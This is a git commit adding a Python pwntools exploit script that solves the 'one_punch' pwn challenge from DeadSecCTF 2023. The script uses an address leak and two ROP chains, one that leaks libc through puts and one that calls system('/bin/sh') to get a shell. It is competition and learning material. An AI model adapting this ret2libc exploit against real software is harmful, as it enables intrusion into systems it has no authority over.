21ea73d057d26f57629067241c59e54d5be7eb64
Zeeshan1234 <mayub9799@gmail.com>
2023-11-14 13:21:17 +0500

    DeadSecCTF-2023

---
+++ DeadSecCTF-2023/pwn/pwn_one-punch/script.py
@@ -0,0 +1,47 @@
+from pwn import *
+context.arch = "amd64"
+
+io = process("./one_punch")
+# io = remote("netcat.deadsec.quest", 31794)
+elf = ELF("./one_punch")
+libc = ELF("./libc.so.6")
+if args.GDB:
+	gdb.attach(io)
+
+io.recvuntil(b"cape! ")
+leak = int(io.recvline()[:-1], 16)
+log.info(f"program address at: {hex(leak)}")
+base = leak - 0x1291
+log.info(f"program base is at: {hex(base)}")
+elf.address = base
+
+key = base + 0x4050
+rop = ROP(elf)
+payload = b"A"*120
+payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
+payload += p64(elf.got.gets)
+payload += p64(elf.plt.puts)
+payload += p64(rop.find_gadget(['ret'])[0])
+
+payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
+payload += p64(key)
+payload += p64(elf.sym['gets'])
+payload += p64(elf.symbols.main)
+io.sendline(payload)
+
+io.recvline()
+leak = unpack(io.recvline()[:-1], "all")
+log.info(f'Gets leak => {hex(leak)}')
+libc.address = leak - libc.symbols.gets
+log.info(f'Libc base => {hex(libc.address)}')
+
+io.sendline(p64(0))
+
+payload = b"A"*120
+payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
+payload += p64(next(libc.search(b'/bin/sh')))
+payload += p64(rop.find_gadget(['ret'])[0])
+payload += p64(libc.symbols.system)
+io.sendlineafter(b"hero?", payload)
+
+io.interactive()
